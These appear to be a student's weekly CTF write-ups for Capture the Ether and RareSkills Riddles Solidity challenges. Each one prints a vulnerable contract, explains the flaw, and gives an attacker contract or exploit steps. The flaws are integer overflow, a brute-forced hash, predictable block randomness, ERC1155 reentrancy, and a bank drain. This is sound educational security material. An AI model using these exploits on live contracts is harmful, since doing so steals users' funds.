# Week 2

## Capture the Ether (RareSkills Repo) - Token Sale

### Contract

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract TokenSale {
    mapping(address => uint256) public balanceOf;
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    constructor() payable {
        require(msg.value == 1 ether, "Requires 1 ether to deploy contract");
    }

    function isComplete() public view returns (bool) {
        return address(this).balance < 1 ether;
    }

    function buy(uint256 numTokens) public payable returns (uint256) {
        uint256 total = 0;
        unchecked {
            total += numTokens * PRICE_PER_TOKEN;
        }
        require(msg.value == total);

        balanceOf[msg.sender] += numTokens;
        return (total);
    }

    function sell(uint256 numTokens) public {
        require(balanceOf[msg.sender] >= numTokens);

        balanceOf[msg.sender] -= numTokens;
        (bool ok, ) = msg.sender.call{value: (numTokens * PRICE_PER_TOKEN)}("");
        require(ok, "Transfer to msg.sender failed");
    }
}
```

### Exploit

While this challenge is part of a Foundry repo, it can also be conveniently solved in Remix without the need to write any code.

To complete the challenge, we need to find a way to issue ourselves tokens either for free or at least at a discount so that we can sell the tokens back at the normal price for a profit.

First, observe that `buy` has an unchecked block, allowing `total` to overflow. So, our first idea could be to choose `numTokens` in such a way that `total == 0`. (In this case, we would trick the contract into issuing us tokens _for free_.) Note that, since we're working with `uint256`, we have: `0 == 2**256`. Hence, a `numTokens` value that would yield `total == 0` can be computed via `2**256 / PRICE_PER_TOKEN == 2**256 / 10**18`. However, doing so, e.g., with [WolframAlpha](https://www.wolframalpha.com/), we see that the exact result of this computation is _not_ an integer:

```
2**256 / 10**18 == 441711766194596082395824375185729628956870974218904739530401550323154944 / 3814697265625
```

Hence, we cannot use this value as our `numTokens` input parameter because `numTokens` has to be an unsigned integer.

We can, however, overflow `total` just enough so that `numTokens` can be specified as an integer. Sure, in this case, we don't get all our tokens for free, but we would get them at a huge discount.

More precisely, we want to find an `x` such that `2**256 + x == 0 mod 10**18`. If we solve this equation in WolframAlpha, we get `x == 415992086870360064`. Now, if we compute `(2**256 + 415992086870360064) / 10**18`, we get `115792089237316195423570985008687907853269984665640564039458` as the integer value that we can use for `numTokens` in order to overflow `total`.

In other words,  if we call `buy` and specify `numTokens = 115792089237316195423570985008687907853269984665640564039458`, then we only need to pay 415992086870360064 wei (0.41599... ether) to get 115792089237316195423570985008687907853269984665640564039458 tokens in return!

After calling `buy` in this way, the contract's new balance is 1.415992086870360064 ether, i.e., it didn't even earn the price of a single token (1 ether) but issued an insane amount of tokens to us. We can subsequently call `sell` with `numTokens = 1` to earn 1 ether from the contract, resulting in a contract balance of 0.415992086870360064 ether (< 1 ether), which completes the challenge.

# Week 1

## Capture the Ether (RareSkills Repo) - Guess the Secret Number

### Contract

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract GuessTheSecretNumber {
    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;

    constructor() payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable returns (bool) {
        require(msg.value == 1 ether);

        if (keccak256(abi.encodePacked(n)) == answerHash) {
            (bool ok,) = msg.sender.call{value: 2 ether}("");
            require(ok, "Failed to Send 2 ether");
        }
        return true;
    }
}
```

### Exploit

Note that `n` is of data type `uint8`, i.e., the number we're looking for must be an unsigned integer between 0 and 255. Since the set of possible solutions is so small, we can easily brute-force the solution either on-chain or off-chain.

The code below demonstrates how to solve this challenge on-chain:

_GetSecretNumber.sol_
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract GuessTheSecretNumber {
    ...
}

contract ExploitContract {
    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;

    function Exploiter() public view returns (uint8) {
        uint8 n;
        for (uint8 i; i < 255; i++) {
            if (keccak256(abi.encodePacked(i)) == answerHash) {
                n = i;
            }
        }
        return n;
    }
}

```

_GetSecretNumber.t.sol_
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/GuessSecretNumber.sol";

contract GuessSecretNumberTest is Test {
    ExploitContract exploitContract;
    GuessTheSecretNumber guessTheSecretNumber;

    function setUp() public {
        // Deploy "GuessTheSecretNumber" contract and deposit one ether into it
        guessTheSecretNumber = (new GuessTheSecretNumber){value: 1 ether}();

        // Deploy "ExploitContract"
        exploitContract = new ExploitContract();
    }

    function testFindSecretNumber() public {
        uint8 secretNumber = exploitContract.Exploiter();
        _checkSolved(secretNumber);
    }

    function _checkSolved(uint8 _secretNumber) internal {
        assertTrue(guessTheSecretNumber.guess{value: 1 ether}(_secretNumber), "Wrong Number");
        assertTrue(guessTheSecretNumber.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
```

## Capture the Ether (RareSkills Repo) - Guess the New Number

### Contract

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract GuessNewNumber {
    constructor() payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable returns (bool pass) {
        require(msg.value == 1 ether);
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));

        if (n == answer) {
            (bool ok,) = msg.sender.call{value: 2 ether}("");
            require(ok, "Fail to send to msg.sender");
            pass = true;
        }
    }
}
```

### Exploit

Since both `blockhash(block.number - 1)` and `block.timestamp` can also be accessed by an attacker contract, we can reproduce `answer` inside an attacker contract using the exact same code:

_GetNewNumber.sol_
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract GuessNewNumber {
    ...
}

contract ExploitContract {
    GuessNewNumber public guessNewNumber;
    uint8 public answer;

    function Exploit() public returns (uint8) {
        answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
        return answer;
    }
}
```

_GetNewNumber.t.sol_
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/GuessNewNumber.sol";

contract GuessNewNumberTest is Test {
    GuessNewNumber public guessNewNumber;
    ExploitContract public exploitContract;

    function setUp() public {
        // Deploy contracts
        guessNewNumber = (new GuessNewNumber){value: 1 ether}();
        exploitContract = new ExploitContract();
    }

    function testNumber(uint256 blockNumber, uint256 blockTimestamp) public {
        // Prevent zero inputs
        vm.assume(blockNumber != 0);
        vm.assume(blockTimestamp != 0);
        // Set block number and timestamp
        vm.roll(blockNumber);
        vm.warp(blockTimestamp);

        // Place your solution here
        uint8 answer = exploitContract.Exploit();
        _checkSolved(answer);
    }

    function _checkSolved(uint8 _newNumber) internal {
        assertTrue(guessNewNumber.guess{value: 1 ether}(_newNumber), "Wrong Number");
        assertTrue(guessNewNumber.isComplete(), "Balance is supposed to be zero");
    }

    receive() external payable {}
}
```

## Capture the Ether (RareSkills Repo) - Predict the Future

### Contract

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract PredictTheFuture {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    constructor() payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == address(0));
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;

        guesser = address(0);
        if (guess == answer) {
            (bool ok,) = msg.sender.call{value: 2 ether}("");
            require(ok, "Failed to send to msg.sender");
        }
    }
}
```

### Exploit

Note that `answer` has to be an integer between 0 and 9 because it is computed modulo 10. Therefore, we can lock in any guess, e.g., 0, and spam the contract by calling `settle` multiple times across multiple blocks. Notice that because `settle` will reset `guesser` to the zero address, we need to ensure the transaction reverts if we guessed wrong. (Otherwise, we'd be required to always call `lockInGuess` before calling `settle`. In particular, we'd be required to pay 1 ether for each attempt, making our spamming strategy unprofitable.)

We can conveniently execute this attack in Remix using the attacker contract below.

NOTE: `lockInGuess` must be called via the attacker contract to pass `require(msg.sender == guesser)` during settlement.

```solidity
//SPDX-License-Identifier: UNLICENSE
pragma solidity ^0.8.13;

import "./PredictTheFuture.sol";

contract ExploitContract {
    PredictTheFuture public predictTheFuture;

    constructor(PredictTheFuture _predictTheFuture) {
        predictTheFuture = _predictTheFuture;
    }

    function lockInGuess() external payable {
        predictTheFuture.lockInGuess{value: 1 ether}(0);
    }

    function attack() external {
        predictTheFuture.settle();
        require(predictTheFuture.isComplete(), "Exploit failed");
    }

    receive() external payable {} 
}
```

## RareSkills Riddles - Overmint1-ERC1155

### Contract

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC1155/ERC1155.sol";
import "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Holder.sol";

contract Overmint1_ERC1155 is ERC1155 {
    using Address for address;
    mapping(address => mapping(uint256 => uint256)) public amountMinted;
    mapping(uint256 => uint256) public totalSupply;

    constructor() ERC1155("Overmint1_ERC1155") {}

    function mint(uint256 id, bytes calldata data) external {
        require(amountMinted[msg.sender][id] <= 3, "max 3 NFTs");
        totalSupply[id]++;
        _mint(msg.sender, id, 1, data);
        amountMinted[msg.sender][id]++;
    }

    function success(address _attacker, uint256 id) external view returns (bool) {
        return balanceOf(_attacker, id) == 5;
    }
}
```

### Exploit

The `mint` function doesn't follow the checks-effects-interactions pattern and is, therefore, vulnerable to reentrancy. To see this, note that the ERC1155 `_mint` function calls `_doSafeTransferAcceptanceCheck` under the hood, which in turn calls `onERC1155Received` on the receiving contract. This hands over control to the receiving contract before `amountMinted` is updated.

Therefore, we can solve this challenge using a custom `onERC1155Received` function that reenters `mint` until our attacker contract has a balance of 5 tokens of a given `id`. 

_Overmint1_ERC1155_Attacker.sol_
```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";
import "./Overmint1-ERC1155.sol";

contract Overmint1_ERC1155_Attacker is IERC1155Receiver {
    Overmint1_ERC1155 public overmint1ERC1155;

    constructor(address _victim) {
        overmint1ERC1155 = Overmint1_ERC1155(_victim);
    }

    // Fallback function can be used to start the attack
    function attack() public {
        overmint1ERC1155.mint(0, "");
        overmint1ERC1155.safeTransferFrom(address(this), msg.sender, 0, 5, "");
    }

    function onERC1155Received(address operator, address from, uint256 id, uint256 value, bytes calldata data)
        external
        override
        returns (bytes4)
    {
        if (overmint1ERC1155.balanceOf(address(this), 0) < 5) {
            overmint1ERC1155.mint(0, "");
        }
        return this.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(
        address operator,
        address from,
        uint256[] calldata ids,
        uint256[] calldata values,
        bytes calldata data
    ) external pure override returns (bytes4) {
        return this.onERC1155BatchReceived.selector;
    }

    function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
        return interfaceId == type(IERC1155Receiver).interfaceId;
    }
}
```

_Overmint1-ERC1155.js_
```javascript
const {
    loadFixture,
} = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "Overmint1_ERC1155";

describe(NAME, function () {
    async function setup() {
        const [owner, attackerWallet] = await ethers.getSigners();

        const VictimFactory = await ethers.getContractFactory(NAME);
        const victimContract = await VictimFactory.deploy();

        return { victimContract, attackerWallet };
    }

    describe("exploit", async function () {
        let victimContract, attackerWallet;
        before(async function () {
            ({ victimContract, attackerWallet } = await loadFixture(setup));
        })

        it("conduct your attack here", async function () {
            const AttackerFactory = await ethers.getContractFactory("Overmint1_ERC1155_Attacker");
            const attackerContract = await AttackerFactory.connect(attackerWallet).deploy(victimContract.address);
            await attackerContract.connect(attackerWallet).attack();
        });

        after(async function () {
            expect(await victimContract.balanceOf(attackerWallet.address, 0)).to.be.equal(5);
            expect(await ethers.provider.getTransactionCount(attackerWallet.address)).to.lessThan(3, "must exploit in two transactions or less");
        });
    });
});
```

## Capture the Ether (RareSkills Repo) - Token Bank

### Contract

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface ITokenReceiver {
    function tokenFallback(address from, uint256 value, bytes memory data) external;
}

contract SimpleERC223Token {
    // Track how many tokens are owned by each address.
    mapping(address => uint256) public balanceOf;

    string public name = "Simple ERC223 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    uint256 public totalSupply = 1000000 * (uint256(10) ** decimals);

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor() {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function isContract(address _addr) private view returns (bool is_contract) {
        uint256 length;
        assembly {
            //retrieve the size of the code on target address, this needs assembly
            length := extcodesize(_addr)
        }
        return length > 0;
    }

    function transfer(address to, uint256 value) public returns (bool success) {
        bytes memory empty;
        return transfer(to, value, empty);
    }

    function transfer(address to, uint256 value, bytes memory data) public returns (bool) {
        require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);

        if (isContract(to)) {
            ITokenReceiver(to).tokenFallback(msg.sender, value, data);
        }
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value) public returns (bool success) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool success) {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
}

contract TokenBankChallenge {
    SimpleERC223Token public token;
    mapping(address => uint256) public balanceOf;
    address public player;

    constructor(address _player) {
        token = new SimpleERC223Token();
        player = _player;
        // Divide up the 1,000,000 tokens, which are all initially assigned to
        // the token contract's creator (this contract).
        balanceOf[msg.sender] = 500000 * 10 ** 18; // half for me
        balanceOf[player] = 500000 * 10 ** 18; // half for you
    }

    function addcontract(address _contract) public {
        balanceOf[_contract] = 500000 * 10 ** 18;
    }

    function isComplete() public view returns (bool) {
        return token.balanceOf(address(this)) == 0;
    }

    function tokenFallback(address from, uint256 value, bytes memory data) public {
        require(msg.sender == address(token));
        require(balanceOf[from] + value >= balanceOf[from]);

        balanceOf[from] += value;
    }

    function withdraw(uint256 amount) public {
        require(balanceOf[msg.sender] >= amount);

        require(token.transfer(msg.sender, amount));
        unchecked {
            balanceOf[msg.sender] -= amount;
        }
    }
}
```

### Exploit

I'm not sure whether this design is intentional, but the RareSkills challenge differs from the original Capture the Ether challenge. More specifically, the RareSkills version contains an additional function, `addcontract`, that can be used to drain the bank easily. The most convenient way to follow along is Remix.

After deployment, we have `token.balanceOf(address(this)) == 10**6 * 10**18`, where `address(this)` refers to the bank's address. To complete the challenge, we must reduce this balance to 0.

However, achieving that is straightforward by using the following sequence of actions:

1. Deploy `TokenBankChallenge` specifying the deployer's address as the `_player`.
2. Call `withdraw` from the deployer's account, specifying the amount to be `500_000_000_000_000_000_000_000`.
3. Call `addcontract`, specifying the deployer's address for the `_contract` parameter.
4. Call `withdraw` from the deployer's account, specifying the amount to be `500_000_000_000_000_000_000_000`.

Performing the above steps solves the challenge.

NOTE: The original Capture the Ether challenge does _not_ contain the `addcontract` function. However, notice that `withdraw` doesn't follow the checks-effects-interactions pattern and is, therefore, vulnerable to reentrancy. (Note that `transfer` calls `tokenFallback` on the receiver.) A detailed solution for this original case is explained in [Christoph Michel's Capture the Ether blog post](https://cmichel.io/capture-the-ether-solutions/).
